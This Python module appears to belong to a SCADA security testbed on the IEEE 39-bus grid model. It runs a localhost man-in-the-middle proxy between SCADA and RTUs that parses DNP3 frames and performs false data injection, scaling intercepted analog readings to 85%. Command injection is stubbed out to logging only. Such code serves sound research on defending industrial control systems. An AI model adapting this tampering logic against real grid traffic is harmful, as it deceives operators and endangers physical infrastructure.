"""
Localhost Traffic Interceptor for MiTM Attacks

Since traditional ARP spoofing doesn't work on localhost (127.0.0.1), 
this module implements traffic interception using:
1. Socket proxy/relay for intercepting localhost communication
2. DNP3 packet parsing and modification
3. Traffic redirection between SCADA and RTU ports

This approach works for simulation environments where all components
run on localhost with different ports.
"""

import asyncio
import logging
import socket
import struct
import time
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
import threading
import queue

logger = logging.getLogger(__name__)

@dataclass
class InterceptionTarget:
    """Target for traffic interception"""
    name: str
    original_ip: str
    original_port: int
    proxy_port: int
    is_active: bool = False

class LocalhostInterceptor:
    """
    Traffic interceptor for localhost-based SCADA-RTU communication.
    
    Creates proxy sockets that sit between SCADA and RTU, allowing
    packet inspection and modification without requiring root privileges
    or network interface manipulation.
    """
    
    def __init__(self):
        """Initialize localhost traffic interceptor"""
        self.is_active = False
        self.proxy_servers: Dict[str, socket.socket] = {}
        self.client_connections: Dict[str, List[socket.socket]] = {}
        self.interception_tasks: List[asyncio.Task] = []
        self.packet_queue = queue.Queue()
        
        # Traffic statistics
        self.stats = {
            'packets_intercepted': 0,
            'packets_modified': 0,
            'bytes_transferred': 0,
            'connections_handled': 0,
            'start_time': None
        }
        
        logger.info("Localhost traffic interceptor initialized")
    
    async def start_interception(self, targets: List[InterceptionTarget]):
        """
        Start intercepting traffic for specified targets.
        
        Args:
            targets: List of interception targets (RTUs)
        """
        if self.is_active:
            logger.warning("Traffic interception already active")
            return
        
        self.is_active = True
        self.stats['start_time'] = time.time()
        
        logger.info(f"Starting traffic interception for {len(targets)} targets")
        
        # Start proxy servers for each target
        for target in targets:
            try:
                await self._start_proxy_server(target)
                logger.info(f"Proxy server started for {target.name} on port {target.proxy_port}")
            except Exception as e:
                logger.error(f"Failed to start proxy for {target.name}: {e}")
        
        logger.info("Traffic interception started successfully")
    
    async def stop_interception(self):
        """Stop all traffic interception"""
        if not self.is_active:
            logger.warning("Traffic interception not active")
            return
        
        self.is_active = False
        
        # Cancel all tasks
        for task in self.interception_tasks:
            task.cancel()
        
        # Close all proxy servers
        for name, server in self.proxy_servers.items():
            try:
                server.close()
                logger.info(f"Closed proxy server for {name}")
            except:
                pass
        
        # Close client connections
        for name, connections in self.client_connections.items():
            for conn in connections:
                try:
                    conn.close()
                except:
                    pass
        
        self.proxy_servers.clear()
        self.client_connections.clear()
        self.interception_tasks.clear()
        
        logger.info("Traffic interception stopped")
    
    async def _start_proxy_server(self, target: InterceptionTarget):
        """Start proxy server for a specific target"""
        # Create proxy server socket
        proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        proxy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        proxy_socket.bind(('127.0.0.1', target.proxy_port))
        proxy_socket.listen(5)
        proxy_socket.setblocking(False)
        
        self.proxy_servers[target.name] = proxy_socket
        self.client_connections[target.name] = []
        
        # Start handling connections
        task = asyncio.create_task(self._handle_proxy_connections(target, proxy_socket))
        self.interception_tasks.append(task)
    
    async def _handle_proxy_connections(self, target: InterceptionTarget, proxy_socket: socket.socket):
        """Handle connections to proxy server"""
        loop = asyncio.get_event_loop()
        
        try:
            while self.is_active:
                try:
                    # Accept new connection
                    client_socket, address = await loop.sock_accept(proxy_socket)
                    logger.info(f"New connection to {target.name} proxy from {address}")
                    
                    self.client_connections[target.name].append(client_socket)
                    self.stats['connections_handled'] += 1
                    
                    # Handle this connection
                    task = asyncio.create_task(
                        self._handle_client_connection(target, client_socket)
                    )
                    self.interception_tasks.append(task)
                    
                except asyncio.CancelledError:
                    break
                except Exception as e:
                    if self.is_active:
                        logger.error(f"Error accepting connection for {target.name}: {e}")
                    await asyncio.sleep(0.1)
        
        except asyncio.CancelledError:
            logger.info(f"Proxy connection handler for {target.name} cancelled")
    
    async def _handle_client_connection(self, target: InterceptionTarget, client_socket: socket.socket):
        """Handle individual client connection through proxy"""
        loop = asyncio.get_event_loop()
        server_socket = None
        
        try:
            # Connect to actual RTU
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setblocking(False)
            
            await loop.sock_connect(server_socket, (target.original_ip, target.original_port))
            logger.info(f"Connected to actual RTU {target.name} at {target.original_ip}:{target.original_port}")
            
            # Start bidirectional data forwarding
            client_to_server_task = asyncio.create_task(
                self._forward_data(client_socket, server_socket, f"{target.name}_C2S")
            )
            server_to_client_task = asyncio.create_task(
                self._forward_data(server_socket, client_socket, f"{target.name}_S2C")
            )
            
            # Wait for either direction to close
            await asyncio.gather(client_to_server_task, server_to_client_task, return_exceptions=True)
            
        except Exception as e:
            logger.error(f"Error handling connection for {target.name}: {e}")
        finally:
            # Clean up sockets
            try:
                client_socket.close()
            except:
                pass
            try:
                if server_socket:
                    server_socket.close()
            except:
                pass
    
    async def _forward_data(self, from_socket: socket.socket, to_socket: socket.socket, direction: str):
        """Forward data between sockets with packet inspection and modification"""
        loop = asyncio.get_event_loop()
        buffer_size = 4096
        
        try:
            while self.is_active:
                try:
                    # Receive data
                    data = await loop.sock_recv(from_socket, buffer_size)
                    if not data:
                        break
                    
                    self.stats['packets_intercepted'] += 1
                    self.stats['bytes_transferred'] += len(data)
                    
                    # Process/modify packet if it's DNP3
                    modified_data = await self._process_packet(data, direction)
                    
                    if modified_data != data:
                        self.stats['packets_modified'] += 1
                        logger.info(f"Modified packet in {direction}: {len(data)} -> {len(modified_data)} bytes")
                    
                    # Forward (possibly modified) data
                    await loop.sock_sendall(to_socket, modified_data)
                    
                except asyncio.CancelledError:
                    break
                except ConnectionResetError:
                    logger.info(f"Connection reset in {direction}")
                    break
                except Exception as e:
                    if self.is_active:
                        logger.error(f"Error forwarding data in {direction}: {e}")
                    break
        
        except asyncio.CancelledError:
            logger.info(f"Data forwarding in {direction} cancelled")
    
    async def _process_packet(self, data: bytes, direction: str) -> bytes:
        """
        Process and potentially modify intercepted packets.
        
        Args:
            data: Raw packet data
            direction: Traffic direction (C2S = client to server, S2C = server to client)
            
        Returns:
            Modified packet data
        """
        try:
            # Check if this looks like DNP3 packet
            if len(data) >= 10 and data[0:2] == b'\x05\x64':
                return await self._modify_dnp3_packet(data, direction)
            else:
                # Not DNP3, pass through unchanged
                return data
                
        except Exception as e:
            logger.error(f"Error processing packet: {e}")
            return data
    
    async def _modify_dnp3_packet(self, data: bytes, direction: str) -> bytes:
        """
        Modify DNP3 packet for attack purposes.
        
        Args:
            data: DNP3 packet data
            direction: Traffic direction
            
        Returns:
            Modified DNP3 packet
        """
        try:
            # Parse DNP3 header
            if len(data) < 10:
                return data
            
            # DNP3 header structure (simplified)
            start_bytes = data[0:2]  # Should be 0x0564
            length = struct.unpack('<H', data[2:4])[0]
            control = data[4]
            dest_addr = struct.unpack('<H', data[5:7])[0]
            src_addr = struct.unpack('<H', data[7:9])[0]
            
            logger.debug(f"DNP3 packet: len={length}, dest={dest_addr}, src={src_addr}, dir={direction}")
            
            # Apply attack modifications based on direction
            if direction.endswith("S2C"):  # Server to Client (RTU response to SCADA)
                return await self._modify_rtu_response(data)
            elif direction.endswith("C2S"):  # Client to Server (SCADA request to RTU)
                return await self._modify_scada_request(data)
            
            return data
            
        except Exception as e:
            logger.error(f"Error modifying DNP3 packet: {e}")
            return data
    
    async def _modify_rtu_response(self, data: bytes) -> bytes:
        """
        Modify RTU response for False Data Injection attacks.
        
        Args:
            data: Original RTU response
            
        Returns:
            Modified response with false data
        """
        try:
            # For simulation, modify analog values in responses
            if len(data) > 20:
                modified_data = bytearray(data)
                
                # Look for analog input values and modify them
                # This is a simplified approach - real implementation would 
                # need proper DNP3 parsing
                for i in range(10, len(modified_data) - 4):
                    if i + 4 < len(modified_data):
                        # Check if this might be a float value
                        try:
                            original_value = struct.unpack('<f', modified_data[i:i+4])[0]
                            if 0 < original_value < 1000:  # Reasonable range for voltage/power
                                # Inject false data (reduce by 10-20%)
                                false_value = original_value * 0.85
                                struct.pack_into('<f', modified_data, i, false_value)
                                logger.info(f"FDI: Modified value {original_value:.2f} -> {false_value:.2f}")
                                break
                        except:
                            continue
                
                return bytes(modified_data)
            
            return data
            
        except Exception as e:
            logger.error(f"Error in FDI attack: {e}")
            return data
    
    async def _modify_scada_request(self, data: bytes) -> bytes:
        """
        Modify SCADA request for False Command Injection attacks.
        
        Args:
            data: Original SCADA request
            
        Returns:
            Modified request with false commands
        """
        try:
            # For demonstration, we'll log the command but not modify it
            # Real FCI would inject malicious control commands
            logger.info(f"Intercepted SCADA command: {len(data)} bytes")
            
            # Could inject false commands here
            # For safety in simulation, we just log
            return data
            
        except Exception as e:
            logger.error(f"Error in FCI attack: {e}")
            return data
    
    def get_stats(self) -> Dict[str, Any]:
        """Get current interception statistics"""
        stats = self.stats.copy()
        if stats['start_time']:
            stats['uptime'] = time.time() - stats['start_time']
        return stats
    
    def get_status(self) -> Dict[str, Any]:
        """Get current status"""
        return {
            'is_active': self.is_active,
            'proxy_servers': len(self.proxy_servers),
            'active_connections': sum(len(conns) for conns in self.client_connections.values()),
            'stats': self.get_stats()
        }

# Factory function for creating interception targets
def create_rtu_targets() -> List[InterceptionTarget]:
    """Create interception targets for IEEE 39-bus RTUs"""
    targets = []
    
    # RTU locations with proxy ports
    rtu_configs = [
        {'name': 'RTU_Bus30', 'port': 20000, 'proxy': 22000},
        {'name': 'RTU_Bus31', 'port': 20001, 'proxy': 22001},
        {'name': 'RTU_Bus32', 'port': 20002, 'proxy': 22002},
        {'name': 'RTU_Bus33', 'port': 20003, 'proxy': 22003},
        {'name': 'RTU_Bus39', 'port': 20004, 'proxy': 22004},
    ]
    
    for config in rtu_configs:
        target = InterceptionTarget(
            name=config['name'],
            original_ip='127.0.0.1',
            original_port=config['port'],
            proxy_port=config['proxy']
        )
        targets.append(target)
    
    return targets

# Test function
async def test_localhost_interception():
    """Test localhost traffic interception"""
    interceptor = LocalhostInterceptor()
    
    try:
        print("Testing localhost traffic interception...")
        
        # Create test targets
        targets = create_rtu_targets()[:2]  # Test with 2 RTUs
        
        # Start interception
        await interceptor.start_interception(targets)
        
        print("Interception active. Connect SCADA to proxy ports:")
        for target in targets:
            print(f"  {target.name}: 127.0.0.1:{target.proxy_port} -> 127.0.0.1:{target.original_port}")
        
        # Run for 30 seconds
        await asyncio.sleep(30)
        
        # Show stats
        stats = interceptor.get_stats()
        print(f"Test results: {stats}")
        
    finally:
        await interceptor.stop_interception()
        print("Test completed")

if __name__ == "__main__":
    asyncio.run(test_localhost_interception())